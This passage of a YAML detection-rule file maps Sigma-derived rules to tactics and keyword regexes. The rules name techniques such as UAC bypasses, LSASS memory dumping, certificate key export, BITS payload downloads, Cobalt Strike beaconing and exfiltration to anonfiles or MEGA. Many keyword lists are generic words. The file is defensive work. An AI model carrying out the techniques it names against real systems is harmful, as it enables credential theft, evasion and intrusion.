      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b40a734_99b6_4b98_a1d0_1cea51a08ab2
  intent: execution
  tactic: execution
  description: Detects the creation of files that indicator an interactive use of
    PowerShell in the SYSTEM user context
  conditions:
    summary:
      regex_any:
      - suspicious
      - interactive
      - powershell
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_80e1f67a_4596_4351_98f5_a9c3efabac95
  intent: execution
  tactic: execution
  description: Detects the creation of tasks from processes executed from suspicious
    locations
  conditions:
    summary:
      regex_any:
      - suspicious
      - scheduled
      - task
      - write
      - system32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_162ab1e4_6874_4564_853c_53ec3ab8be01
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the creation of log files during a TeamViewer remote session
  conditions:
    summary:
      regex_any:
      - teamviewer
      - remote
      - session
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3a9fa2ec_30bc_4ebd_b49e_7c9cff225502
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation or modification of a vscode related powershell
    profile which could indicate suspicious activity as the profile can be used as
    a mean of persistence
  conditions:
    summary:
      regex_any:
      - vscode
      - powershell
      - profile
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1d2de8a6_4803_4fde_b85b_f58f3aa7a705
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects suspicious Windows Defender Application Control (WDAC) policy
    file creation from abnormal processes that could be abused by attacker to block
    EDR/AV components while allowing their own malicious code to run on the system.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - wdac
      - policy
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b64de98_9db3_4033_bd7a_f51430105f00
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation or modification of the Windows Terminal Profile
    settings file "settings.json" by an uncommon process.
  conditions:
    summary:
      regex_any:
      - windows
      - terminal
      - profile
      - settings
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34746e8c_5fb8_415a_b135_0abc167e912a
  intent: execution
  tactic: execution
  description: Detects the creation of binaries in the WinSxS folder by non-system
    processes
  conditions:
    summary:
      regex_any:
      - winsxs
      - executable
      - file
      - creation
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a1255c5_d732_4b62_ac02_b5152d34fb83
  intent: reconnaissance
  tactic: discovery
  description: Detects the dual use tool ADExplorer writing a complete AD snapshot
    into a .dat file. This can be used by attackers to extract data for Bloodhound,
    usernames for password spraying or use the meta data for social engineering. The
    snapshot doesn't contain password hashes but there have been cases, where administrators
    put passwords in the comment field.
  conditions:
    summary:
      regex_any:
      - adexplorer
      - writing
      - complete
      - snapshot
      - into
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_814ddeca_3d31_4265_8e07_8cc54fb44903
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of a file that has the same name as the default
    LiveKD kernel memory dump.
  conditions:
    summary:
      regex_any:
      - livekd
      - kernel
      - memory
      - dump
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16fe46bb_4f64_46aa_817d_ff7bec4a2352
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of the LiveKD driver, which is used for live kernel
    debugging
  conditions:
    summary:
      regex_any:
      - livekd
      - driver
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_059c5af9_5131_4d8d_92b2_de4ad6146712
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of the LiveKD driver by a process image other
    than "livekd.exe".
  conditions:
    summary:
      regex_any:
      - livekd
      - driver
      - creation
      - uncommon
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_de46c52b_0bf8_4936_a327_aace94f94ac6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects creation of the Process Explorer drivers by processes other
    than Process Explorer (procexp) itself.

    Hack tools or malware may use the Process Explorer driver to elevate privileges,
    drops it to disk for a few moments, runs a service using that driver and removes
    it afterwards.

    '
  conditions:
    summary:
      regex_any:
      - process
      - explorer
      - driver
      - creation
      - sysinternals
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a05baa88_e922_4001_bc4d_8738135f27de
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects creation of the Process Monitor driver by processes other than
    Process Monitor (procmon) itself.
  conditions:
    summary:
      regex_any:
      - process
      - monitor
      - driver
      - creation
      - sysinternals
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_304afd73_55a5_4bb9_8c21_0b1fc84ea9e4
  intent: unknown
  tactic: s0029
  description: Detects creation of the PSEXEC key file. Which is created anytime a
    PsExec command is executed. It gets written to the file system and will be recorded
    in the USN Journal on the target system
  conditions:
    summary:
      regex_any:
      - psexec
      - remote
      - execution
      - file
      - artefact
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07a99744_56ac_40d2_97b7_2095967b0e03
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential privilege escalation attempt via the creation of
    the "*.Exe.Local" folder inside the "System32" directory in order to sideload
    "comctl32.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - privilege
      - escalation
      - attempt
      - local
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_69ca12af_119d_44ed_b50f_a47af0ebc364
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the creation of an "lsass.dmp" file by the taskmgr process.
    This indicates a manual dumping of the LSASS.exe process memory using Windows
    Task Manager.
  conditions:
    summary:
      regex_any:
      - lsass
      - process
      - memory
      - dump
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52753ea4_b3a0_4365_910d_36cff487b789
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the usage of tsclient share to place a backdoor on the RDP
    source machine's startup folder
  conditions:
    summary:
      regex_any:
      - hijack
      - legit
      - session
      - move
      - laterally
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_62ed5b55_f991_406a_85d9_e8e8fdf18789
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll
    (UACMe 22)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - consent
      - comctl32
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_93a19907_d4f9_4deb_9f91_aac4692776a6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe
    DLL hijacking (UACMe 39)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - code
      - profiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_63e4f530_65dc_49cc_8f80_ccfa95c69d43
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of a UAC bypass using Windows Event Viewer
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - eventvwr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48ea844d_19b1_4642_944e_fe39c2cc1fec
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of a file by "dllhost.exe" in System32 directory
    part of "IDiagnosticProfileUAC" UAC bypass technique
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - idiagnostic
      - profile
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bdd8157d_8e85_4397_bb82_f06cc9c71dbb
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - ieinstal
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41bb431f_56d8_4691_bb56_ed34e390906f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe
    55)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - msconfig
      - token
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7fff6773_2baa_46de_a24a_b6eec1aba2d1
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe
    DLL hijacking (UACMe 36)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - ntfs
      - reparse
      - point
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_155dbf56_e0a4_4dd0_8905_8a98705045e8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe
    (UACMe 52)
  conditions:
    summary:
      regex_any:
      - bypass
      - abusing
      - winsat
      - path
      - parsing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_68578b43_65df_4f81_9a9b_92f32711a951
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll
    (UACMe 32)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - windows
      - media
      - player
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8468111a_ef07_4654_903b_b863a80bbc95
  intent: unknown
  tactic: resource_development
  description: 'Detects creation of ".vhd"/".vhdx" files by browser processes.

    Malware can use mountable Virtual Hard Disk ".vhd" files to encapsulate payloads
    and evade security controls.

    '
  conditions:
    summary:
      regex_any:
      - image
      - download
      - browser
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56e05d41_ce99_4ecd_912d_93f019ee0b71
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the creation of file by the "node.exe" process in the ".vscode-server"
    directory. Could be a sign of remote file creation via VsCode tunnel feature

    '
  conditions:
    summary:
      regex_any:
      - visual
      - studio
      - code
      - tunnel
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d102b8f5_61dc_4e68_bd83_9a3187c67377
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the creation of a file with the name "code_tunnel.json" which
    indicate execution and usage of VsCode tunneling utility by an "Image" or "Process"
    other than VsCode.

    '
  conditions:
    summary:
      regex_any:
      - renamed
      - vscode
      - code
      - tunnel
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39f1f9f2_9636_45de_98f6_a4046aa8e4b9
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of files with certain extensions on a static web
    site. This can be indicative of potential uploads of a web shell.
  conditions:
    summary:
      regex_any:
      - potential
      - webshell
      - creation
      - static
      - website
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28a452f3_786c_4fd8_b8f2_bddbe9d616d1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of a file named "WerFault.exe" or "wer.dll" in
    an uncommon folder, which could be a sign of WerFault DLL hijacking.
  conditions:
    summary:
      regex_any:
      - creation
      - werfault
      - unusual
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74a2b37d_fea4_41e0_9ac7_c9fbcf1f60cc
  intent: persistence_installation
  tactic: persistence
  description: 'Detects WinRAR creating files in Windows startup locations, which
    may indicate an attempt to establish persistence by adding malicious files to
    the Startup folder.

    This kind of behaviour has been associated with exploitation of WinRAR path traversal
    vulnerability CVE-2025-6218 or CVE-2025-8088.

    '
  conditions:
    summary:
      regex_any:
      - winrar
      - creating
      - files
      - startup
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d353dac0_1b41_46c2_820c_d7d2561fc6ed
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via
    winrm.vbs and copied cscript.exe (can be renamed)
  conditions:
    summary:
      regex_any:
      - bypass
      - with
      - winrm
      - malicious
      - wsmpty
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d5aca11_22b3_4f22_b7ba_90e60533e1fb
  intent: execution
  tactic: execution
  description: Detects the creation of the default output filename used by the wmiexec
    tool
  conditions:
    summary:
      regex_any:
      - wmiexec
      - default
      - output
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_614a7e17_5643_4d89_b6fe_f9df1a79641c
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a threat actor creating a file named `wbemcomn.dll` in the
    `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI
    DLL Hijack scenario.
  conditions:
    summary:
      regex_any:
      - wmiprvse
      - wbemcomn
      - hijack
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_33f41cdd_35ac_4ba8_814b_c6a4244a1ad4
  intent: persistence_installation
  tactic: persistence
  description: Detects file writes of WMI script event consumer
  conditions:
    summary:
      regex_any:
      - persistence
      - script
      - event
      - consumer
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e94b9ddc_eec5_4bb8_8a58_b9dc5f4e185f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects creation of a file named "wpbbin" in the "%systemroot%\system32\"
    directory. Which could be indicative of UEFI based persistence method
  conditions:
    summary:
      regex_any:
      - uefi
      - persistence
      - wpbbin
      - filecreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4aafb0fa_bff5_4b9d_b99e_8093e659c65f
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Aversaries may use to interact with a remote network share using Server
    Message Block (SMB).

    This technique is used by post-exploitation frameworks.

    '
  conditions:
    summary:
      regex_any:
      - writing
      - local
      - admin
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab90dab8_c7da_4010_9193_563528cfa347
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of a binary file with the ".sed" extension. The
    ".sed" extension stand for Self Extraction Directive files.

    These files are used by the "iexpress.exe" utility in order to create self extracting
    packages.

    Attackers were seen abusing this utility and creating PE files with embedded ".sed"
    entries.

    Usually ".sed" files are simple ini files and not PE binaries.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - self
      - extraction
      - directive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3f673b3_65d1_4d80_9146_466f8b63fa99
  intent: impact_operations
  tactic: impact
  description: Detects file renames where the target filename uses an uncommon double
    extension. Could indicate potential ransomware activity renaming files and adding
    a custom extension to the encrypted files, such as ".jpg.crypted", ".docx.locky",
    etc.
  conditions:
    summary:
      regex_any:
      - suspicious
      - appended
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_401e5d00_b944_11ea_8f9a_00163ecd60ae
  intent: execution
  tactic: execution
  description: Detect run not allowed files. Applocker is a very useful tool, especially
    on servers where unprivileged users have access. For example terminal servers.
    You need configure applocker and log collect to receive these events.
  conditions:
    summary:
      regex_any:
      - file
      - allowed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ae53108_c3a0_4bee_8f45_c7591a2c337f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an appx package deployment that was blocked by AppLocker policy
  conditions:
    summary:
      regex_any:
      - deployment
      - appx
      - package
      - blocked
      - applocker
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09d3b48b_be17_47f5_bf4e_94e7e75d09ce
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential installation or installation attempts of known malicious
    appx packages
  conditions:
    summary:
      regex_any:
      - potential
      - malicious
      - appx
      - package
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e021bbb5_407f_41f5_9dc9_1864c45a7a51
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an appx package deployment that was blocked by the local computer
    policy
  conditions:
    summary:
      regex_any:
      - deployment
      - appx
      - package
      - blocked
      - policy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_898d5fc9_fbc3_43de_93ad_38e97237c344
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an appx package installation with the error code "0x80073cff"
    which indicates that the package didn't meet the signing requirements and could
    be suspicious
  conditions:
    summary:
      regex_any:
      - suspicious
      - appx
      - package
      - installation
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8b48ad89_10d8_4382_a546_50588c410f0d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects an appx package added to the pipeline of the "to be processed"
    packages which was downloaded from a suspicious domain.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - remote
      - appx
      - package
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5cdeaf3d_1489_477c_95ab_c318559fc051
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an appx package added the pipeline of the "to be processed"
    packages which is located in suspicious locations
  conditions:
    summary:
      regex_any:
      - suspicious
      - appx
      - package
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c977cb50_3dff_4a9f_b873_9290f56132f1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an appx package added the pipeline of the "to be processed"
    packages which is located in uncommon locations
  conditions:
    summary:
      regex_any:
      - uncommon
      - appx
      - package
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b5aa7d60_c17e_4538_97de_09029d6cd76b
  intent: execution
  tactic: execution
  description: Detects execution of AppX packages with known suspicious or malicious
    signature
  conditions:
    summary:
      regex_any:
      - suspicious
      - digital
      - signature
      - appx
      - package
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b85e5894_9b19_4d86_8c87_a2f3b81f0521
  intent: persistence_installation
  tactic: persistence
  description: Detects new BITS transfer job saving local files with potential suspicious
    extensions
  conditions:
    summary:
      regex_any:
      - bits
      - transfer
      - downloading
      - file
      - potential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d635249d_86b5_4dad_a8c7_d7272b788586
  intent: persistence_installation
  tactic: persistence
  description: Detects BITS transfer job downloading files from a file sharing domain.
  conditions:
    summary:
      regex_any:
      - bits
      - transfer
      - download
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90f138c1_f578_4ac3_8c49_eecfd847c8b7
  intent: persistence_installation
  tactic: persistence
  description: Detects a BITS transfer job downloading file(s) from a direct IP address.
  conditions:
    summary:
      regex_any:
      - bits
      - transfer
      - download
      - from
      - direct
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d44fb93_e7d2_475c_9d3d_54c9c1e33427
  intent: persistence_installation
  tactic: persistence
  description: Detects a suspicious download using the BITS client from a FQDN that
    is unusual. Adversaries may abuse BITS jobs to persistently execute or clean up
    after malicious payloads.
  conditions:
    summary:
      regex_any:
      - bits
      - transfer
      - with
      - uncommon
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8a56cb7_a363_44ed_a82f_5926bb44cd05
  intent: persistence_installation
  tactic: persistence
  description: Detects new BITS transfer job where the LocalName/Saved file is stored
    in a potentially suspicious location
  conditions:
    summary:
      regex_any:
      - bits
      - transfer
      - download
      - potential
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e2b5163d_7deb_4566_9af3_40afea6858c3
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when an application acquires a certificate private key
  conditions:
    summary:
      regex_any:
      - certificate
      - private
      - acquired
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58c0bff0_40a0_46e8_b5e8_b734b84d2017
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when an application exports a certificate (and potentially
    the private key as well) from the local Windows certificate store.
  conditions:
    summary:
      regex_any:
      - certificate
      - exported
      - from
      - local
      - certificate
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5daf11c3_022b_4969_adb9_365e6c078c7c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects block events for files that are disallowed by code integrity
    for protected processes
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - disallowed
      - file
      - protected
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4be5675_4a53_426a_8c81_a8bb2387e947
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects blocked load events that did not meet the authenticode signing
    level requirements or violated the code integrity policy.
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - blocked
      - image
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b72b82d_f1c5_4632_b589_187159bc6ec1
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects blocked load attempts of revoked drivers
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - blocked
      - driver
      - load
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_320fccbf_5e32_4101_82b8_2679c5f007c6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the load of a revoked kernel driver
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - revoked
      - kernel
      - driver
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f156c48_3894_4952_baf0_16193e9067d2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects blocked image load events with revoked certificates by code
    integrity.
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - blocked
      - image
      - load
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_881b7725_47cc_4055_8000_425823344c59
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects image load events with revoked certificates by code integrity.
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - revoked
      - image
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_951f8d29_f2f6_48a7_859f_0673ff105e6f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the presence of a loaded unsigned kernel module on the system.
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - unsigned
      - kernel
      - module
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c92c24e7_f595_493f_9c98_53d5142f5c18
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects loaded unsigned image on the system
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - unsigned
      - image
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f8cd7a0_9d5a_4f62_9f8b_2c951aa0dd1f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects loaded kernel modules that did not meet the WHQL signing requirements.
  conditions:
    summary:
      regex_any:
      - codeintegrity
      - unmet
      - whql
      - requirements
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_29f171d7_aa47_42c7_9c7b_3c87938164d9
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects DNS queries for anonfiles.com, which is an anonymous file upload
    platform often used for malicious purposes
  conditions:
    summary:
      regex_any:
      - query
      - anonfiles
      - domain
      - client
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_66474410_b883_415f_9f8d_75345a0a66a6
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects DNS queries for subdomains related to MEGA sharing website
  conditions:
    summary:
      regex_any:
      - query
      - mega
      - hosting
      - website
      - client
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8b69fd42_9dad_4674_abef_7fdef43ef92a
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects DNS queries for subdomains related to "Put.io" sharing website.
  conditions:
    summary:
      regex_any:
      - query
      - client
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8384bd26_bde6_4da9_8e5d_4174a7a47ca2
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects DNS resolution of an .onion address related to Tor routing
    networks
  conditions:
    summary:
      regex_any:
      - query
      - onion
      - address
      - client
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0d18728b_f5bf_4381_9dcf_915539fff6c2
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a program that invoked suspicious DNS queries known from Cobalt
    Strike beacons
  conditions:
    summary:
      regex_any:
      - suspicious
      - cobalt
      - strike
      - beaconing
      - client
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d444368_6da1_43fe_b2fc_44202430480e
  intent: unknown
  tactic: reconnaissance
  description: Detects when a DNS zone transfer failed.
  conditions:
    summary:
      regex_any:
      - failed
      - zone
      - transfer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cbe51394_cd93_4473_b555_edf0144952d9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a DNS server error in which a specified plugin DLL (in registry)
    could not be loaded
  conditions:
    summary:
      regex_any:
      - server
      - error
      - failed
      - loading
      - serverlevelplugindll
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cde0a575_7d3d_4a49_9817_b8004a7bf105
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a rule has been added to the Windows Firewall exception
    list
  conditions:
    summary:
      regex_any:
      - uncommon
      - firewall
      - rule
      - added
      - windows
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e2575e7_2cb9_4da1_adc8_ed94221dca5e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the addition of a new rule to the Windows Firewall exception
    list for an application located in a potentially suspicious location.
  conditions:
    summary:
      regex_any:
      - firewall
      - rule
      - added
      - windows
      - firewall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eca81e8d_09e1_4d04_8614_c91f44fd0519
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the addition of a new "Allow" firewall rule by the WMI process
    (WmiPrvSE.EXE).

    This can occur if an attacker leverages PowerShell cmdlets such as "New-NetFirewallRule",
    or directly uses WMI CIM classes such as "MSFT_NetFirewallRule".

    '
  conditions:
    summary:
      regex_any:
      - firewall
      - rule
      - added
      - windows
      - firewall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_79609c82_a488_426e_abcf_9f341a39365d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a all the rules have been deleted from the Windows Defender
    Firewall configuration
  conditions:
    summary:
      regex_any:
      - rules
      - have
      - been
      - deleted
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c187c075_bb3e_4c62_b4fa_beae0ffc211f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a single rules or all of the rules have been deleted from
    the Windows Defender Firewall
  conditions:
    summary:
      regex_any:
      - rule
      - been
      - deleted
      - from
      - windows
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5b40a90_baf5_4bf7_a6f7_373494881d22
  intent: persistence_installation
  tactic: persistence
  description: Detects changes to of the IIS server configuration in order to disable/remove
    the ETW logging/processing option.
  conditions:
    summary:
      regex_any:
      - logging
      - processing
      - option
      - disabled
      - server
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e8ebd53a_30c2_45bd_81bb_74befba07bdb
  intent: persistence_installation
  tactic: persistence
  description: Detects changes to of the IIS server configuration in order to disable
    HTTP logging for successful requests.
  conditions:
    summary:
      regex_any:
      - http
      - logging
      - disabled
      - server
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dd857d3e_0c6e_457b_9b48_e82ae7f86bd7
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of a new module to an IIS server.
  conditions:
    summary:
      regex_any:
      - module
      - module
      - added
      - server
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_31d68132_4038_47c7_8f8e_635a39a7c174
